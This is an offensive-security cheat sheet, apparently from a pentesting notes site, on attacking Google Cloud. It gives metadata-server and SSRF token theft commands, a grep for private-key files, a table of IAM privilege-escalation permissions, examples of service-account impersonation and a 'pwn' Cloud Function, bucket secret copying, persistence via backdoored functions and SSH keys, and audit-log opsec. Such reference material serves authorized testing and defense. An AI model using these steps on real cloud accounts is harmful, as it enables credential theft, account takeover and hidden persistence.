---
tags:
  - Cloud
---

# :material-google-cloud: GCP

<span class="pill pill-hard">cloud</span> <span class="pill pill-info">service accounts</span>

Google Cloud centers on **service accounts (SAs)** and their OAuth tokens. Privilege escalation is almost always "use one permission to obtain another SA's token, then repeat."

!!! abstract "TL;DR"
    Pull an OAuth token from the metadata server → `gcloud auth list` / decode scopes → enumerate IAM → abuse a token-minting or job-running permission (`iam.serviceAccounts.getAccessToken`, `actAs`, deploy jobs) to hop to a more privileged SA → Owner.

## :material-key: Getting tokens

=== "Metadata server (from a GCE VM)"

    ```bash
    # OAuth access token for the attached service account
    curl -H "Metadata-Flavor: Google" \
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

    # Enumerate available SAs & scopes
    curl -H "Metadata-Flavor: Google" \
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/?recursive=true"
    ```
    Reach it via [SSRF](../web/ssrf.md) with the required `Metadata-Flavor: Google` header.

=== "gcloud / key files"

    ```bash
    gcloud auth list
    gcloud config list
    find / -name '*.json' 2>/dev/null | xargs grep -l private_key 2>/dev/null
    gcloud auth activate-service-account --key-file=sa.json
    ```

!!! loot "Scopes matter as much as roles"
    A metadata token is limited by the VM's **OAuth scopes** *and* the SA's IAM roles. A VM with `cloud-platform` scope + a powerful SA is a jackpot; a narrow scope can neuter even an Owner SA.

## :material-format-list-bulleted: Enumeration

```bash
gcloud projects list
gcloud config get-value project
gcloud projects get-iam-policy <project>            # who has what
gcloud iam service-accounts list
gcloud compute instances list
gcloud storage buckets list

# Attacker tooling
cloudfox gcp                                        # attacker-focused inventory
# https://github.com/GoogleCloudPlatform/security-analytics
# Purple/Blue: hayat, gcp_scanner; Red: GCP-IAM-Privilege-Escalation (RhinoSecurity)
```

## :material-arrow-up-bold-hexagon-outline: Privilege escalation

<span class="pill pill-hard">token-hopping</span>

RhinoSecurity documented ~30 GCP privesc primitives. The heavy hitters:

| Permission | Escalation |
| --- | --- |
| `iam.serviceAccounts.getAccessToken` | Mint a token for a more-privileged SA |
| `iam.serviceAccounts.actAs` + deploy | Run a job/function *as* another SA |
| `iam.serviceAccountKeys.create` | Create a JSON key for any SA |
| `iam.serviceAccounts.implicitDelegation` | Chain to a downstream SA |
| `iam.roles.update` | Add permissions to a role you hold |
| `setIamPolicy` on project/SA | Grant yourself Owner |
| `cloudfunctions.functions.create` + actAs | Deploy code running as a privileged SA |
| `compute.instances.setMetadata` | Add an SSH key / startup-script as the VM SA |

Example — impersonate a more-privileged SA:

```bash
gcloud iam service-accounts get-access-token \
  target-sa@project.iam.gserviceaccount.com \
  --format='value(accessToken)'
# Use it:
curl -H "Authorization: Bearer <TOKEN>" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/<project>:getIamPolicy"
```

Example — run code as a privileged SA via a Cloud Function:

```bash
gcloud functions deploy pwn --runtime python39 --trigger-http \
  --allow-unauthenticated --service-account privileged-sa@... \
  --entry-point main --source .
```

## :material-bucket: Cloud Storage (GCS)

```bash
gcloud storage ls
gcloud storage ls gs://bucket-name
gcloud storage cp gs://bucket-name/secret.json .
# Anonymous access to a public bucket:
curl https://storage.googleapis.com/bucket-name/object
```

!!! loot "Startup scripts & metadata"
    VM instance metadata and startup scripts frequently embed secrets. Also grep buckets for `*.json` SA keys and terraform state.

## :material-anchor: Persistence

- Create a **new SA key** (JSON) — long-lived, survives reboots.
- Add your SSH key via `compute.instances.setMetadata`.
- Grant an external account a role via `setIamPolicy`.
- Deploy a backdoored Cloud Function / Cloud Run service.

!!! opsec "Cloud Audit Logs record admin activity"
    `SetIamPolicy`, key creation, and function deploys land in **Admin Activity** logs (on by default, hard to disable). Data-access logs may also capture your reads.

## :material-link-variant: Related

- Same SSRF-to-metadata entry as [AWS](aws.md) / [Azure](azure.md).
- Reference: [HackTricks Cloud – GCP](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html), [RhinoSecurity GCP privesc](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).
